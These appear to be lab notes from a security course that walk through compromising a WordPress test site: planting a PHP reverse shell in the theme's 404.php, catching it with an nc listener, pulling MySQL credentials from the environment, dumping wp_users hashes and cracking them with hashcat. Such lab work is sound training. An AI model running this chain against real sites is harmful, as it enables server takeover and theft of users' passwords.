## Cryptographic Failures (WordPress Lab)

- ⚠️ Best to watch the video — this is a hands-on lab.
    

---

### 1. Exploiting the Theme

- Edit the `404.php` file in WordPress 2021 theme
    
- Add a PHP reverse shell (e.g., PentestMonkey)
    
- Listener:
    
    ```bash
    nc -nvlp 8000
    ```
    
- Get your IP via:
    
    ```bash
    ip a
    ```
    

---

### 2. Reverse Shell Access

- Once triggered, you’ll get a shell on the container
    
- Access WordPress files like `wp-config.php`
    
- Extract MySQL credentials (usually from environment variables):
    
    ```bash
    env
    ```
    

---

### 3. MySQL Access

```bash
mysql -u wordpress -h db -p
# password as shown in the env variables
```

Example SQL commands:

```sql
use wordpress;
show tables;
select * from wp_users;
exit;
```

---

### 4. Hash Cracking

- WordPress stores **hashed passwords**
    
- Dumped user hashes (like `password123`) use the **phpass** algorithm
    

Use Hashcat:

```bash
# Mode 400 is phpass
hashcat -a 0 -m 400 will.hash ~/usr/share/..../best1050.txt
```

### Why This is a Crypto Failure

- Weak password
- Weak hash format
